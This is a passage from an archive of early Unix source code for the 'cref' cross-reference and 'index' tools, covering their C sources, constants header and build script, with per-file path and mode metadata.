		while((curf[curfl] = *argv[i]++) != 0 && curfl <=8)
			if(curf[curfl++] == '/')	curfl = 0;
		curf[curfl++] = '\t';
		if(curfl == 8) curf[8] = -1;

pipe:
		ibuf = ibuf1;
		lno = 1;

		driver();

		close(file);
	}
	flsh(0);
	close(tp[0]);


/*	monitor(0);	/*INSTR*/
/*	dexit();	/*INSTR*/

/*	times(tbuf);	/*INSTR*/
/*	tm1 = tbuf[0]/6;	/*INSTR*/
/*	tm2 = tbuf[1]/6;	/*INSTR*/
/*	printf("Prep:  %d  %d\n", tm1, tm2);	/*INSTR*/

/*	exit();	/*DEBUG*/
	fn = "/bin/sort";
	av[0] = "sort";
	av[1] = tmp[0];
	av[2] = "-o";
	av[3] = tmp[0];
	av[4] = 0;

	callsys(fn, av);

/*	times(tbuf);	/*INSTR*/
/*	tm1 = tbuf[3]/6;	/*INSTR*/
/*	tm2 = tbuf[5]/6;	/*INSTR*/
/*	printf("Sort:  %d  %d\n", tm1, tm2);	/*INSTR*/

	if(usw) {
		fn = "/usr/bin/upost";
		av[0] = "upost";
		i = 0;
	} else if(count) {
		fn = "count";
		av[0] = "count";
		i = 0;
	} else {
		fn = "/usr/bin/crpost";
		av[0] = "crpost";
		av[1] = "-E";
		i = 1;
	}
	av[++i] = tmp[0];
	av[++i] = 0;

	callsys(fn,av);

/*	times(tbuf);	/*INSTR*/
/*	tm1 = tbuf[3]/6 - tm1;	/*INSTR*/
/*	tm2 = tbuf[5]/6 - tm2;	/*INSTR*/
/*	printf("Post:  %d  %d\n", tm1, tm2);	/*INSTR*/

	dexit();
}

driver()
{
	auto	p;

top:
	l = -1;
	while((c = line[++l] = getc(ibuf)) != -1) {
/*	printf("driver: c = %o l = %d\n",c,l); /*DEBUG*/
		if(l >= 299) {
			printf("Line too long: %d.\n",lno);
			dexit();
		}

		if(c & 0200) {
			printf("Illegal character: %o line %d\n",c,lno);
			dexit();
		}

		if(fl) {
			if((*flag[fl])())
				continue;
		}

/*printf("cs = %d cc = %c ca = %d\n",cs,c,tab[cs].cl[c]);	/*DEBUG*/

		if(p = tab[cs].cl[c])
			(*acts[p])();
		continue;
	}
	if(ibuf == ibuf1)	return;
	ibuf = ibuf1;
	goto top;

}

init()
{
	int	b[3];
	auto	fi,i;
	extern	coll(),save(),out(),asym(),asw(),csym(),csw();
	extern	incl(),decl(),sk(),sk2();
	extern	dexit();

	ibuf1 = &ib1;



	if((fi = open(gtab,0)) < 0) {
		printf("Cannot open grammar table; see lem\n");
		dexit();
	}

	i = -1;
	while(++i < NUMS)
		if(read(fi,tab[i].cl,256) < 256) {
			printf("Bad grammar table; see lem\n");
			dexit();
		}

	close(fi);



	if(signal(1,1) != 1)	signal(1,&dexit);
	if(signal(2,1) != 1)	signal(2,&dexit);
	if(signal(3,1) != 1)	signal(3,&dexit);
	while((tp[1] = creat(tmp[1],0)) < 0)
		tmp[1][9]++;
	close(tp[1]);
	tmp[0][9] = tmp[1][9];
	tp[0] = creat(tmp[0],CREATC);

	if(count)	return;

	itab.hptr = &ipsp;
	itab.symt = &issp;
	itab.hsiz = PTRI;
	itab.ssiz = CHARI;
	itab.nsym = 0;
	itab.curb = 1;

	if((fi = open(ignonl,0)) < 0) {
		printf("Cannot open ignore/only file.\n");
		dexit();
	}
	if((read(fi,b,6) == 6) && (b[0] == 0100200)) {
		if(read(fi,itab.hptr,b[1]) < b[1]) {
			printf("Cannot read ignore/only file.\n");
			dexit();
		}
		if(read(fi,itab.symt,b[2]) < b[2]) {
			printf("Cannot read ignor/only file.\n");
			dexit();
		}
		close(fi);
	} else {
		close(fi);
		compile();
	}
	return;
}

error(a)
{
	printf("Error %d\n",a);
	dexit();
}

dexit()
{
	extern	nflush;

/*	printf("nflush = %d\n",nflush);	/*DEBUG*/
	if(tp[0] > 0 && utmp == 0) {
		unlink(tmp[0]);
		unlink(tmp[1]);
	}
	exit();
}

callsys(f,v)
	char	f[],*v[];
{
	int	t,status,i;

	if((t = fork()) == 0) {
		for(i = 1; i <= 12; i++)	signal(i,0);
		execv(f,v);
		printf("Can't find %s\n",f);
		exit(1);
	} else {
		if(t == -1) {
			printf("Try again\n");
			return(1);
		}
	}

	while(t != wait(&status));
/*	printf("Status = %o, %s\n",status,f);	/*DEBUG*/
	if((t = (status & 0377)) != 0) {
		if(t != 2) {
			printf("Fatal error in %s\n",f);
			printf("t = %d\n",t);
		}
		dexit();
	}
	return((status>>8) & 0377);
}

flags(argv)
	char	*argv[];
{
	int	j,xx;
	char	*ap;

	j = 1;
	ap = argv[1];
	while(*++ap != '\0') {
		switch(*ap) {

			default:
				printf("Unrecognized flag: %c\n",*ap);
				dexit();

			case 'c':
				count = 1;
				continue;

			case 'i':	/* Ignore file */
				if(!xx) {
					xx = 1;
					only = 0;
					ignonl = argv[++j];
				}
				continue;

			case 'o':	/*only file*/
				if(!xx) {
					xx = 1;
					only = 1;
					ignonl = argv[++j];
				}
				continue;

			case 'p':
				page = 1;
				continue;

			case 't':
				utmp = argv[++j];
				tmp[0] = argv[j];
				continue;

			case 'u':	/* Unique symbols only */
				usw = 1;
				continue;

			case 'w':	/* Word list only */
				word = 1;
				continue;

		}
	}
	return(j);
}


compile()
{
	char	buf[40],*b;
	int	i,v;

	fopen(ignonl,ibuf1);

	b = buf - 1;
	while((*++b = getc(ibuf1)) != -1) {
		if(*b == '\n') {
			*b = '\0';
			search(buf,b - buf,&itab,1);
			b = buf - 1;
		} else {
			if(*b == '\t') {
				v = 0;
				while((i = getc(ibuf1)) != -1) {
					if(i == '\n')	break;
					v = v*10 + (i - '0');
				}
				search(buf,b - buf,&itab,v);
				b = buf - 1;
			} else {
				if((b - buf) > 39) {
					printf("Ignore/only symbol too long.\n");
					dexit();
				}
			}
		}
	}
	close(ibuf1);
	return;
}
-- /usr/source/cref/index/ind1.c mode=0100664 uid=3 gid=3 atime=174920812 mtime=169260040 --
#
# include "econs.h"
# include "ecmn.h"
# define SKIP 0
# define COLLECT 1
# define SKIP2 2

char	mone	-1;
int	tlno	1;

coll()
{
	cs = COLLECT;
	temp[t1].beg = &line[l];
	return;
}

save()
{
	extern	only;
	char	*pt1,*pt2,cbuf[30];
	int	a,tt,val;

	cs = SKIP;
	line[l] = '\0';
	temp[t1].ct = &line[l] - temp[t1].beg;
	if(!count)
		if(temp[t1].ct == 1)	goto no;
	pt1 = temp[t1].beg-1;
	pt2 = cbuf-1;

	while(*++pt2 = *++pt1)
		if(*pt2 >= 'A' && *pt2 <= 'Z')
			*pt2 =| 040;

	if(count)
		goto yes;
	val = search(cbuf,temp[t1].ct,&itab,0);

	if(!val == !only)	goto yes;
no:
	line[l] = c;
	return(0);
yes:
	if(count == 0) {
		tt = t1;
		while(tt)
			if(comp(temp[t1].beg,temp[--tt].beg))	goto no;
	}
	temp[t1++].term = c;
	return(1);
}

out()
{
	auto	i,ct,t2;
	char	*b,*e;
	if(cs == COLLECT)	save();
	ct = t1;
	while(ct--)
		temp[ct].beg[temp[ct].ct] = temp[ct].term;
	t2 = t1 - 1;
	while(t1--) {
/*printf("t1 = %d  beg = %o  ct = %d\n",t1,temp[t1].beg,temp[t1].ct); /* DEBUG */
		if((ct = temp[t1].ct) >= 15) {
			ct = 15;
		}
		put(temp[t1].beg,ct);
		if(count) {
			put("\n", 1);
			continue;
		}

		put("\t",1);

		if(!page) {
			put(curf,curfl);
			conf(lno,4,curs);
			put(curs,4);
		} else {
			conf(pn,4,curs);
			put(curs,4);
		}
		if(word == 0) {
			put("\t",1);
			if(t1 >= 1)
				b = temp[t1-1].beg;
			else
				b =  line;
			if(t2 > t1)
				e = temp[t1+1].beg + temp[t1+1].ct;
			else
			e = &line[l];
/*printf("e = %o	b = %o\n",e,b);	/*DEBUG*/
			put(b,e-b);
		}
		put("\n",1);
	}
	t1 = 0;
	l = -1;
	lno =+ tlno;
	tlno = 1;
	cs = SKIP;
	return;
}


search(symbol,length,params,install)
	char	*symbol;
	int	length;
	struct	htab	*params;
	int	install;
{
	char	*sp,*p;
	static	int	*hptr,hsiz,nsym;
	static	char	*ssiz;
	static	int	curb;
	static	char	*symt;
	auto	h,i,j,k;

	if(hptr != params->hptr) {
		hptr = params->hptr;
		hsiz = params->hsiz;
		symt = params->symt;
		ssiz = params->ssiz;
		curb = params->curb;
		nsym = params->nsym;
	}

	symbol[length] = '\0';
/*printf("ssiz = %d; nsym = %d; %s\n", ssiz, nsym, symbol);/*DEBUG*/
	sp = symbol;

	i = length;
	h = 1;
	while(i--)
		h =* *sp++;

	if(h == 0100000) {
		h = 1;
	} else {
		h = h<0?(-h)%hsiz:h%hsiz;
	}
	if(h == 0)	h++;
/*		printf("%s %d\n",symbol,h);	/*DEBUG*/

	while((p = &symt[hptr[h]]) > symt) {
		j = length + 2;
		sp = symbol;
		while(--j) {
			if(*p++ != *sp++)	goto no;
		}
		return(*p);
no:
		h = (h + h)%hsiz;
	}
	if(install) {
		if(++nsym >= hsiz) {
			printf("Too many symbols in ignore/only file.\n");
			dexit();
		}

		hptr[h] = curb;
		length++;
		if((curb + length) >= ssiz) {
			printf("i/o file too big; ssiz = %d\n", ssiz);
			dexit();
		}

		while(length--)
			symt[curb++] = *symbol++;
		symt[curb++] = install;
		params->curb = curb;
		params->nsym = nsym;
	}
	return(0);
}

conf(n,width,buf) 
	char	*buf;
{
	auto	i,a;

	i = width;
	while(i--)	buf[i] = ' ';

	buf[(a = n/10)?conf(a,--width,buf):--width] = n%10 + '0';

	return(++width);
}

comp(a,b)
	char	*a;
	char	*b;
{
	a--;
	b--;
	while(*++a == *++b)
		if(*a == '\0')	return(1);
	return(0);
}


hyphen()
{
/*	printf("hyphen\n");	/*DEBUG*/
	if(gch[fl] == 0)
		flag[++fl] = &hyp1;
	return(1);
}

hyp1()
{
/*	printf("hyp1 c = %o\n",c);	/*DEBUG*/
	if(c !=  '\n') {
		fl--;
		return(0);
	} else {
		l =- 2;
		flag[fl] = &hyp2;
		hsw = 1;
		return(1);
	}
}

hyp2()
{
/*	printf("hyp2 c = %o l = %d\n",c,l);	/*DEBUG*/
	if(hsw && (tab[2].cl[c] == 0)) {
		l--;
		if(c == 3)	pno();
		if(c == '\n')	tlno++;
		return(1);
	}
	hsw = 0;
	if(tab[cs].cl[c]) {
		line[l] = '\n';
		out();
		fl--;
		return(0);
	}
	return(1);
}

pno()
{
	if(flag[fl] != &pno) {
		flag[++fl] = &pno;
		pn = 0;
		return(1);
	}
	if(c == '\n') {
		fl--;
		out();
		return(1);
	}
	pn = pn*10 + c - '0';
	return(1);
}
-- /usr/source/cref/index/ind2.c mode=0100664 uid=3 gid=3 atime=174920825 mtime=169260040 --
int	optr;

char	obuf[512];

int	nflush;

put(string,n)
	char	*string;
{
	extern	utmp;
	int	i;
	char	*o;

/*printf("%d %c %d\n",fil,*string,n);/*DEBUG*/

	string--;

	if((i = optr + n - 512) >= 0) {
		n =- i;
		o = &obuf[optr] -1;
		while(--n >= 0)
			*++o = *++string;
		optr = 512;
		flsh(1);
		n = i;
	}

	o = &obuf[optr] - 1;
	optr =+ n;

	while(--n >= 0) {
		*++o = *++string;
	}
	return(0);
}

flsh(fil)
{
	extern	tp[],utmp;

	if(optr <= 0)	return(optr);

	nflush++;
	if(write(tp[0],obuf,optr) != optr)
		return(-1);
	optr = 0;
	return(0);
}

-- /usr/source/cref/mcons.h mode=0100664 uid=3 gid=3 atime=174920765 mtime=169260008 --
# define NUMA 14
# define NUMC 128
# define NUMS 3
# define SIZA 8
# define SIZC 2
# define SIZS 8
# define PTRI 509
# define CHARI 4000
# define PTRX 509
# define CHARX 4000
# define CONT	1
# define COLL	2
# define SAVE	3
# define OUT	4
# define ASYM	5
# define ASW	6
# define CSYM	7
# define CSW	8
# define INCL	9
# define DECL	10
# define SK2	11
# define SK	12
# define TABS	13
# define SEMI	14
# define SHARP	15

# define SKIP	0
# define COLLECT	1
# define SKIP2	2
#define	CREATC	0644
-- /usr/source/cref/run mode=0100664 uid=3 gid=3 atime=174920836 mtime=174917269 --
chdir tab
cc mtab.c
a.out atable atab
a.out ctable ctab
a.out etable etab
cmp atab /usr/lib/atab
cp atab /usr/lib/atab
cmp ctab /usr/lib/ctab
cp ctab /usr/lib/ctab
cmp etab /usr/lib/etab
cp etab /usr/lib/etab
rm a.out atab ctab etab

chdir ../src
cc -s -O upost.c
cmp a.out /usr/bin/upost
cp a.out /usr/bin/upost
cc -s -O crpost.c
cmp a.out /usr/bin/crpost
cp a.out /usr/bin/crpost
cc -s -O dr.c acts.c put.c
cmp a.out /usr/bin/cref
cp a.out /usr/bin/cref
rm a.out *.o

chdir ../index
cc -s -O ind?.c
cmp a.out /usr/bin/index
cp a.out /usr/bin/index
rm a.out *.o
-- /usr/source/cref/src mode=0140775 uid=3 gid=3 atime=174930099 mtime=174920796 --
-- /usr/source/cref/src/acts.c mode=0110664 uid=3 gid=3 atime=174920766 mtime=169260064 --
#
# include "../mcons.h"
# include "../ccmn.h"
# define SKIP 0
# define COLLECT 1
# define SKIP2 2

int	cross	1;
int	order	1;
char	mone	-1;

coll()
{
	cs = COLLECT;
	temp[t1].beg = &line[l];
	return;
}

save()
{
	extern	wspace();

	line[l] = '\0';
	temp[t1].ct = &line[l] - temp[t1].beg;
	temp[t1].term = c;

	if((c == ' ' || c == '\t') && cflag) {
		gch[++fl] = mone;
		flag[fl] = &wspace;
	} else {
		sav1();
	}
	return;
}

sav1()
{
	extern	only;
	struct tempent	*ptr;
	int	a,tt,val;

	if(cflag && c == '(' && level == 0)	csym();

	cs = SKIP;

	ptr = &temp[t1];
	val = search(ptr->beg,ptr->ct,&itab,0);

	if(xsw) {
	    switch(val) {
		case 0:
			if((!level&&!hlevel)||(c == '(')||xtrn
				|| ssw) {
				search(ptr->beg,ptr->ct,&xtab,1);
				goto yes;
			} else {
				if(search(ptr->beg,ptr->ct,&xtab,0))
					goto yes;
			}
			goto no;

		case 1:
			goto no;

		case 2:
			xtrn = 1;
			goto no;

		case 3:
			if(hlevel)	type = 1;
			if(!level&&!hlevel)	ssw = 1;
			goto no;

		case 4:
			if(hlevel)	type = 1;
			goto no;
	    }
	}

	if(hlevel && (val == 4 || val == 3))	type = 1;
	if(!val == !only)	goto yes;
no:
	*(ptr->beg + ptr->ct) = ptr->term;
	return(0);
yes:
	tt = t1;
	while(tt)
		if(comp(ptr->beg,temp[--tt].beg))	goto no;
	t1++;
	return(1);
}

out()
{
	auto	i,ct;
	if(cs == COLLECT)	save();

	ct = t1;
	while(ct--)
		temp[ct].beg[temp[ct].ct] = temp[ct].term;

	while(t1--) {
/*printf("t1 = %d  beg = %d  ct = %d\n",t1,temp[t1].beg,temp[t1].ct); /* DEBUG */

		switch(order) {

			case 1:
				if(utmp)
					i = 0;
				else
					i = dfile(temp[t1].beg);

				if((ct = temp[t1].ct) >= 8) {
					ct = 8;
					*curf = -1;
				} else {
					*curf = '\t';
				}

				put(i,temp[t1].beg,ct);
				put(i,curf,curfl);
				if(cross)	put(i,curs,cursl);
				conf(lno,4,lbuf);
				put(i,lbuf,5);
				break;

			case 2:
				i = dfile(curf+1);
				put(i,curf+1,curfl-1);
				if(cross)	put(i,curs,cursl);
				else {
					conf(lno,4,lbuf);
					put(i,lbuf,5);
				}
				if((ct = temp[t1].ct) >= 8) {
					put(i,temp[t1].beg,8);
					put(i,&mone,1);
				} else {
					put(i,temp[t1].beg,ct);
					put(i,"\t",1);
				}
				if(cross) {
					conf(lno,4,lbuf);
					put(i,lbuf,5);
				}
				break;

			case 3:
				i = dfile(curs);
				put(i,curs,cursl);
				if((ct = temp[t1].ct) >= 8) {
					put(i,temp[t1].beg,8);
					*curf = -1;
				} else {
					put(i,temp[t1].beg,ct);
					*curf = '\t';
				}
				put(i,curf,curfl);
				conf(lno,4,lbuf);
				put(i,lbuf,5);
		}
		put(i,line,l + 1);

	}
	t1 = 0;
	l = -1;
	lno++;
	cs = SKIP;

	return;
}


asym()
{
	int	i;
	char	*p;

	if(cs == COLLECT) {
		if(cross) {
			p = temp[t1].beg;
			cursl = &line[l] - p;
			cursl = cursl>8?8:cursl;
			i = -1;
			while(++i < cursl)
				curs[i] = *p++;
			if(cursl < 8)
				curs[cursl++] = '\t';
			else
				curs[cursl++] = -1;
		}
		save();
	}
	cs = SKIP;
}

asw()
{
	switch(gch[fl]) {

		case 0:
			if(cs == COLLECT)	save();
			cs = SKIP;
			flag[++fl] = &asw;
			gch[fl] = c;
			return(1);

		case '\'':
			if(c == '\\') {
				gch[fl] = c;
				return(1);
			}
			break;

		case '"':
			gch[fl] = '\'';

			if(c == '\\') {
				flag[++fl] = &asw;
				gch[fl] = c;
				return(1);
			}
			return(1);

		case '<':
			if(c == '\n')	out();
			if(c == '\\') {
				flag[++fl] = &asw;
				gch[fl] = c;
				return(1);
			}
			if(c != '>')	return(1);
			break;

		case '/':
			if(c != '\n')	return(1);

		case '\\': 
			if(c == '\n')	out();

	}
	fl--;
	return(1);

}

csw()
{
	if(cs == COLLECT)	save();

	switch(gch[fl]) {

		case 0:
			if(c == '*')
				if(line[l - 1] != '/')
					return(1);
			gch[++fl] = c;
			flag[fl] = &csw;
			return(1);

		case '*':
			if(c == '\n')	out();
			if(c == '/' && line[l - 1] == '*')
				break;
			return(1);

		case '\'':
		case '"':
			if(c == gch[fl])
				break;
			if(c == '\\') {
				gch[++fl] = c;
				flag[fl] = &csw;
			}
			return(1);

		case '\\':
			break;
		}
		fl--;
		return(1);
}

incl()
{
/*	printf("incl: l = %d hl = %d dl = %d\n",level,hlevel,dlevel);/*DEBUG*/
	if(cs == COLLECT)	save();
	if(hlevel) {
		hlevel = 0;
		level++;
	} else {
		dlevel++;
	}

	cs = SKIP;
}

decl()
{
/*	printf("decl: l = %d hl = %d dl = %d\n",level,hlevel,dlevel);/*DEBUG*/
	if(cs == COLLECT)	save();
	cs = SKIP;
	if(dlevel) {
		dlevel--;
		return;
	}
	if(--level > 0)	return;
	curs[0] = '_';
	curs[1] = '\t';
	cursl = 2;
	level = 0;
	return;
}

csym()
{
	int	i;
	char	*p;

/*	printf("csym: l = %d hl = %d dl = %d\n",level,hlevel,dlevel);/*DEBUG*/
	p = temp[t1].beg;
	if(cs == COLLECT && level == 0) {
		if(cross) {
			cursl = temp[t1].ct;
			cursl = cursl>8?8:cursl;
			i = -1;
			while(++i < cursl)
				curs[i] = *p++;
			if(cursl < 8)
				curs[cursl++] = '\t';
			else
				curs[cursl++] = -1;
		}
		hlevel = 1;
	}
	cs = SKIP;
}

dfile(a)
	char	*a;
{
	if(*a < 'c')	return(0);
	if(*a < 'h')	return(1);
	if(*a < 'r')	return(2);
	return(3);
}


sk2()
{
	cs = SKIP2;
}

sk()
{
	cs = SKIP;
}

tabs()
{
	if(l == 0)	l = -1;
}


search(symbol,length,params,install)
	char	*symbol;
	int	length;
	struct	htab	*params;
	int	install;
{
	char	*sp,*p;
	static	int	curb,*hptr,hsiz,nsym,ssiz;
	static	char	*symt;
	auto	h,i,j,k;

	if(hptr != params->hptr) {
		hptr = params->hptr;
		hsiz = params->hsiz;
		symt = params->symt;
		ssiz = params->ssiz;
		curb = params->curb;
		nsym = params->nsym;
	}

	symbol[length] = '\0';
	sp = symbol;

	i = length;
	h = 1;
	while(i--)
		h =* *sp++;

	if(h == 0100000) {
		h = 1;
	} else {
		h = h<0?(-h)%hsiz:h%hsiz;
	}
	if(h == 0)	h++;
/*		printf("%s %d\n",symbol,h);	/*DEBUG*/

	while((p = &symt[hptr[h]]) > symt) {
		j = length + 2;
		sp = symbol;
		while(--j) {
			if(*p++ != *sp++)	goto no;
		}
		return(*p);
no:
		h = (h + h)%hsiz;
	}
	if(install) {
		if(++nsym >= hsiz) {
			printf("Too many symbols.\n");
			dexit();
		}

		hptr[h] = curb;
		length++;
		if((curb + length) >= ssiz) {
			printf("Too many characters in symbols.\n");
			dexit();
		}

		while(length--)
			symt[curb++] = *symbol++;
		symt[curb++] = install;
		params->curb = curb;
		params->nsym = nsym;
	}
	return(0);
}

conf(n,width,buf) 
	char	*buf;
{
	auto	i,a;

	i = width;
	while(i--)	buf[i] = ' ';

	buf[(a = n/10)?conf(a,--width,buf):--width] = n%10 + '0';

	return(++width);
}


comp(a,b)
	char	*a;
	char	*b;
{
	a--;
	b--;
	while(*++a == *++b)
		if(*a == '\0')	return(1);
	return(0);
}

semi()
{
	if(cs == COLLECT)	save();
	if(only)	return;
	xtrn = 0;
	if(!level) {
		ssw = 0;
		if(!type) {
			hlevel = 0;
			curs[0] = '_';
			curs[1] = '\t';
			cursl = 2;
		}
		type = 0;
	}
	cs = SKIP;
}

wspace()
{
	if(c == ' ' || c == '\t')
		return(1);
	sav1();
	fl--;
	return(0);
}

-- /usr/source/cref/src/crpost.c mode=0100664 uid=3 gid=3 atime=174920735 mtime=169260064 --
/*int	mbuf[1024];	/*INSTR*/
int	ig	100;
int	esw;
int	initf	1;
char	ssp[270];
char	*sym[9]	{ssp,
		ssp + 30,
		ssp + 60,
		ssp + 90,
		ssp + 120,
		ssp + 150,
		ssp + 180,
		ssp + 210,
		ssp + 240,
		ssp + 270
		};

main(argc, argv)
	char	*argv[];
{
	auto	f,fct,file,i;

	if(argc < 2) {
		printf("Usage: crpost [-d] file1 file2 ...\n");
		exit();
	}

	if(*argv[1] == '-') {
		if(argv[1][1] == 'E') {
			fct = 3;
			esw = 1;
			goto on;
		}
		fct = argv[1][1] - '0';
		if((fct < 1) || (fct > 9)) {
			printf("-d: 0 < d < 10\n");
			exit();
		}
		if(argv[1][2] == 'x') {
			ig = fct-1;
		}
on:
		argv++;
		argc--;
	} else {
		fct = 3;
	}

	f = 0;
	while(++f < argc) {
		file = open(argv[f], 0);

		edf(file, fct);

		close(file);
	}
	flsh(0);

	exit();
}

int	lno	1;

edf(file, fct)
{
	auto	i,j,l;
	extern	lno,etext;
	char	brk,*buf,bufsp[150],line[150];
	char extern	*sym[];

/*	monitor(&main,&etext,&mbuf,1024);	/*INSTR*/
	for(i = 0; i < fct; i++)
		*sym[i] = 0200;
fields:
	l = -1;
	buf = &bufsp;

	for(i = 0; i < fct; ++i) {
		buf--;

swt:

		switch(*++buf = get(file)) {

			default:
				if(esw && *buf >= 'A' && *buf <= 'Z'
					&& i == 0)
					*buf =| 040;
				goto swt;

			case -1:
				*buf = ' ';
			case '\t':
				if(i == ig)	continue;
				brk = *buf;
				*buf = '\0';
				buf = &bufsp;
				if(comp(buf, sym[i])) {
					if(esw && i == 0) {
						line[0] = line[1] = '\t';
						l = 1;
						goto rest;
					}
					line[++l] = '\t';
					continue;
				} else {
					copy(buf, sym[i]);
					l =+ copy(buf, &line[++l]);
					line[--l] = brk;
					if(l < 8 && esw && i == 0)
						line[++l] = '\t';
					j = i;
					while(++j < fct)
						*sym[j] = 0200;
					continue;
				}

			case '\n':
				lno++;
				brk = *buf;
				*buf = '\0';
				buf = &bufsp;
				if(comp(buf, sym[i])) {
					goto fields;
				} else {
					copy(buf, sym[i]);
					l =+ copy(buf, &line[++l]);
					line[--l] = '\n';
					j = i;
					while(++j < fct)
						*sym[j] = 0;
					goto out;
				}

			case '\0':
				goto fexit;
		}
	}

rest:
	while((line[++l] = get(file)) != '\n')
		if(line[l] == '\0')	goto fexit;

	lno++;
out:
	if(*line != '\t') {
		put(0,"\n",1);
		lno++;
	}

	put(0,line,++l);

	goto fields;

fexit:
/*	monitor(0);	/*INSTR*/
	return(0);

}


copy(a, b)
	char	*a,*b;
{
	char	*c;

	b--;
	c = --a;
	while(*++b = *++a);
	return(a - c);
}

comp(a, b)
	char	*a, *b;
{
/*	printf("comp: %s %s\n",a,b); /*DEBUG*/
	a--;
	b--;
	while(*++a == *++b) {
		if(*a == '\0')	return(1);
	}
	return(0);
}


char	buf[512];
int	nread	1;

get(ifile) int ifile;
{

	char static *ibuf;

	if(--nread){
		return(*ibuf++);
	}

	if(nread = read(ifile,buf,512)){
		if(nread < 0)goto err;

		ibuf = buf;
		return(*ibuf++);
	}

	nread = 1;
	return(0);

err:
	nread = 1;
	printf("read error\n");
	return(0);

}


int	tp[1]	1;
int	optr[4];
char	bsp[512];

char	*obuf[1]	bsp;

int	nflush;

put(fil,string,n)
	char	*string;
{
	int	i;
	char	*o;

/*printf("%d %c %d\n",fil,*string,n);/*DEBUG*/

	string--;

	if((i = optr[fil] + n - 512) >= 0) {
		n =- i;
		o = &obuf[fil][optr[fil]] -1;
		while(--n >= 0)
			*++o = *++string;
		optr[fil] = 512;
		flsh(fil);
		n = i;
	}

	o = &obuf[fil][optr[fil]] - 1;
	optr[fil] =+ n;

	while(--n >= 0) {
		*++o = *++string;
	}
	return(0);
}

flsh(fil)
{
	extern	tp[];

	if(optr[fil] <= 0)	return(optr[fil]);

	nflush++;
	if(write(tp[fil],obuf[fil],optr[fil]) != optr[fil])
		return(-1);
	optr[fil] = 0;
	return(0);
}

-- /usr/source/cref/src/dr.c mode=0110664 uid=3 gid=3 atime=174920750 mtime=169260064 --
#
# include "../mcons.h"
# include "../ccmn.h"
/*int	mbuf[1024];	/*INSTR*/
/*int	tbuf[36];	/*INSTR*/

int	(*acts[])()	{0,
			&coll,
			&save,
			&out,
			&asym,
			&asw,
			&csym,
			&csw,
			&incl,
			&decl,
			&sk2,
			&sk,
			&tabs,
			&semi
			};

char	*tmp[5]	{"/tmp/crt0a",
		"/tmp/crt1a",
		"/tmp/crt2a",
		"/tmp/crt3a",
		"/tmp/crt4a"
		};

char	*ignonl	"/usr/lib/aign";
char	*gtab	"/usr/lib/atab";

main(argc,argv)
	char	*argv[];
{
	auto	i,j,tm1,tm2,tm3;
	char	*fn,*av[8];
/*	extern	etext;	/*INSTR*/

/*	monitor(&main,&etext,&mbuf,1024);	/*INSTR*/
	if(argc < 2) {
		printf("Usage: cref [-aceilosux] file1 ...\n");
		exit();
	}

	lbuf[4] = '\t';
	if(*argv[1] == '-') {
		j = flags(argv);
		argv =+ j;
		argc =- j;
	}

	init();

	i = 0;
	while(++i < argc) {
		curs[0] = '_';
		curs[1] = '\t';
		curs[4] = '\t';
		cursl = 2;

		if(fopen(argv[i],ibuf1) < 0) {
			printf("Can't open %s\n",argv[i]);
			dexit();
		}
		ibuf = ibuf1;

		curf[0] = '\t';
		curfl = 1;
		while((curf[curfl] = *argv[i]++) != 0 && curfl <= 8)
			if(curf[curfl++] == '/')	curfl = 1;

		curf[curfl++] = '\t';
		if(curfl == 10)	curf[9] = -1;
/*		printf("%s %d\n",curf,curfl);/*DEBUG*/

		lno = 1;

		driver();

		close(file);
	}
	for(j = 0; j < 4;) {
		flsh(j,0);
		close(tp[j++]);
	}

/*	monitor(0);	/*INSTR*/
/*	dexit();	/*INSTR*/

/*	times(tbuf);	/*INSTR*/
/*	tm1 = tbuf[15]/6;	/*INSTR*/
/*	tm2 = tbuf[19]/6;	/*INSTR*/
/*	tm3 = tbuf[23]/6;	/*INSTR*/
/*	printf("Prep: %d  %d  %d\n",tm1,tm2,tm3);	/*INSTR*/

	if(utmp)	exit();
	fn = "/bin/sort";
	av[0] = "sort";
	av[1] = "-a";
	av[3] = "-o";
	av[5] = 0;
	for(i = 0; i < 4; i++) {
		av[4] = av[2] = tmp[i];
		callsys(fn,av);
		if(utmp)	break;
	}

/*	times(tbuf);	/*INSTR*/
/*	tm1 = tbuf[27]/6;	/*INSTR*/
/*	tm2 = tbuf[31]/6;	/*INSTR*/
/*	tm3 = tbuf[35]/6;	/*INSTR*/
/*	printf("Sort: %d  %d  %d\n",tm1,tm2,tm3);	/*INSTR*/

	if(usw) {
		fn = "/usr/bin/upost";
		av[0] = "upost";
		i = 0;
	} else {
		fn = "/usr/bin/crpost";
		av[0] = "crpost";
		av[1] = cross? "-4x": "-3";
		i = 1;
	}
	j = -1;
	while(++j < 4) {
		av[++i] = tmp[j];
		if(utmp)	break;
	}
	av[++i] = 0;

	callsys(fn,av);

/*	times(tbuf);	/*INSTR*/
/*	tm1 = tbuf[27]/6 - tm1;	/*INSTR*/
/*	tm2 = tbuf[31]/6 - tm2;	/*INSTR*/
/*	tm3 = tbuf[35]/6 - tm3;	/*INSTR*/
/*	printf("Post: %d  %d  %d\n",tm1,tm2,tm3);	/*INSTR*/

	dexit();
}

driver()
{
	auto	p;

top:
	l = -1;
	while((c = line[++l] = getc(ibuf)) != -1) {
		if(l >= 131) {
			printf("Line too long: %d %s\n",lno,curf);
			dexit();
		}

		if(c & 0200) {
			printf("Illegal character: %o line %d\n",c,lno);
			dexit();
		}

		if(fl) {
			if((*flag[fl])())
				continue;
		}

/*printf("cs = %d cc = %c ca = %d\n",cs,c,tab[cs].cl[c]);	/*DEBUG*/

		if(p = tab[cs].cl[c])
			(*acts[p])();
		continue;
	}
	if(ibuf == ibuf1)	return;
	ibuf = ibuf1;
	goto top;

}

init()
{
	int	b[3];
	auto	fi,i;
	extern	coll(),save(),out(),asym(),asw(),csym(),csw();
	extern	incl(),decl(),sk(),sk2();
	extern	dexit();

	ibuf1 = &ib1;
	ibuf2 = &ib2;

	xtab.hptr = &xpsp;
	xtab.symt = &xssp;
	xtab.hsiz = PTRX;
	xtab.ssiz = CHARX;
	xtab.nsym = 0;
	xtab.curb = 1;

	itab.hptr = &ipsp;
	itab.symt = &issp;
	itab.hsiz = PTRI;
	itab.ssiz = CHARI;
	itab.nsym = 0;
	itab.curb = 1;

	if((fi = open(gtab,0)) < 0) {
		printf("Cannot open grammar table; see lem\n");
		dexit();
	}

	i = -1;
	while(++i < NUMS)
		if(read(fi,tab[i].cl,256) < 256) {
			printf("Bad grammar table.\n");
			dexit();
		}

	close(fi);


	if((fi = open(ignonl,0)) < 0) {
		printf("Cannot open ignore/only file: %s\n",ignonl);
		dexit();
	}
	if((read(fi,b,6) == 6) && (b[0] == 0100200)) {
